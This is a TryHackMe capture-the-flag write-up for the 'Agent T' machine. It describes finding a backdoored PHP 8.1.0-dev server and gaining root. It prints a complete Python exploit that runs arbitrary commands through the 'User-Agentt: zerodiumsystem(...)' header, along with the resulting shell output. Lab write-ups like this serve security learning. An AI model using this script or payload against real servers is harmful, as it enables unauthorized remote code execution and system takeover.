# TryHackMe - Agent T

**Machine Name:** Agent T  
**Difficulty:** Easy  
**Category:** Web Exploitation / CVE  
**IP Address:** 10.80.164.94  

---

## Description
Agent T is a boot-to-root TryHackMe challenge that focuses on identifying underlying server technologies and leveraging known vulnerabilities. The challenge highlights the dangers of running bleeding-edge, unverified development software in a production environment—specifically a compromised version of PHP.

---

## Enumeration

### Port Scanning
I began with an aggressive `nmap` scan to enumerate open services and identify versions:
```bash
nmap -p- -sV -sC -Pn --min-rate 1000 10.80.164.94 
```

**Findings:**
* **Port 80 (HTTP):** Open. Running `PHP cli server 5.5 or later (PHP 8.1.0-dev)`. The site title is "Admin Dashboard".

### Web Exploration (Port 80)
While the scan performed, I manually checked the website. The main dashboard loaded normally, but clicking the main button redirected to `/index.html`, which returned a "Not Found" error. Digging around the visible web pages didn't yield much. 

However, reviewing the Nmap scan revealed a massive red flag in the HTTP headers: **PHP 8.1.0-dev**.

---

## Exploitation: PHP 8.1.0-dev Backdoor

After a quick Google search for `PHP 8.1.0-dev exploit`, I discovered that an early release of this specific development version was compromised on March 28th, 2021. Malicious actors committed a backdoor directly into the PHP source code. 

The backdoor allows an attacker to achieve Remote Code Execution (RCE) by sending a custom HTTP header (`User-Agentt` with two 't's) containing the command to be executed.

I found a Python exploit script that automates this process and saved it locally:

```python
#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit
else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
```

### Gaining Shell Access
Running the exploit immediately granted a stateless shell as the `root` user:

```bash
python3 php8-1-0-exploit.py
Enter the full host url:
[http://10.80.128.78/](http://10.80.128.78/)

Interactive shell is opened on [http://10.80.128.78/](http://10.80.128.78/) 
Can't acces tty; job crontol turned off.
$ pwd
/var/www/html
```

---

## Post-Exploitation & Flag Retrieval

Because the python shell was stateless, commands like `cd` did not persist between requests. To get around this, I used absolute paths to list the contents of the root directory:

```bash
$ ls -la /
total 76
drwxr-xr-x   1 root root 4096 Mar  7  2022 .
drwxr-xr-x   1 root root 4096 Mar  7  2022 ..
-rwxr-xr-x   1 root root    0 Mar  7  2022 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 30  2021 bin
...[snip]...
-rw-rw-r--   1 root root   38 Mar  5  2022 flag.txt
drwx------   2 root root 4096 Jan 11  2021 root
...[snip]...
```

The `flag.txt` file was sitting right at the base of the file system. I read the file using its absolute path to capture the flag:

```bash
$ cat /flag.txt             
flag{........}
```

---

## Conclusion
This lab demonstrates the severe consequences of utilizing compromised supply chains or running development builds in a live environment. The PHP 8.1.0-dev backdoor was a highly publicized event that allowed trivial remote code execution without any authentication, leading to full system compromise in seconds.
